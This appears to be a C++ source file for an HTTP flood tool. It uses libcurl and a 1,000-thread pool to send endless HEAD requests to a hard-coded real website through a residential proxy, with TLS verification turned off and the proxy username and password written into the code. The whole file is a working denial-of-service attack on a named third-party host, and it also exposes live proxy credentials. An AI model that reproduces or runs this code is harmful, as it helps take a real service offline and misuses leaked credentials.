#include <curl/curl.h>
#include <cstdlib>
#include <iostream>
#include <string>
#include <random>
#include <chrono>

//Our includes.
#include "thread_pool.hpp"

const int max_thread_count = 1000;
BS::thread_pool pool(max_thread_count); // Adjust the pool size as needed

std::string const host = "https://nodec.mediathektv.com";
int version = 11;

std::string const proxy_ip = "http://udc.resi.gg:9999";
std::string const proxy_username = "resi-ProjectElitist";
std::string const proxy_password = "LC2WNWr6gWOXEnbJRSEK";

const std::vector<std::string> proxies = {};

std::random_device rd;
std::mt19937 eng(rd());
std::uniform_int_distribution<> distr(0, proxies.size() - 1);

void curl_test()
{
	CURL* curl = curl_easy_init();
	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
		curl_easy_setopt(curl, CURLOPT_PROXY, proxy_ip.c_str());
		curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, proxy_username.c_str());
		curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, proxy_password.c_str());
		curl_easy_setopt(curl, CURLOPT_URL, host.c_str());

		while (true)
		{
			try
			{
				CURLcode res = curl_easy_perform(curl);
				if (res != CURLE_OK)
					std::cout << res << std::endl;
				
			}
			catch (...)
			{

			}
		}

		curl_easy_cleanup(curl);
	}
}

int main()
{
	srand((unsigned)time(NULL));

	int time_limit = 15;

	for (int i = 0; i < max_thread_count; i++)
	{
		pool.submit_task([] { curl_test(); });
	}

	auto beg = std::chrono::high_resolution_clock::now();
	int last_duration = 0;
	while (true)
	{
		auto end = std::chrono::high_resolution_clock::now();
		auto duration = std::chrono::duration_cast<std::chrono::seconds>(end - beg).count();
		if (duration != last_duration)
		{
			std::cout << "Time Left: " << time_limit - duration << std::endl;
			last_duration = duration;
		}

		if (duration > time_limit)
			break;

		auto running = pool.get_tasks_running();
		auto refil = max_thread_count - running;
		//std::cout << "Refil: " << refil << std::endl;
		for (int i = 0; i < refil; i++)
		{
			pool.submit_task([] { curl_test(); });
		}
	}

	std::cout << "Done!" << std::endl;

	return EXIT_SUCCESS;
}
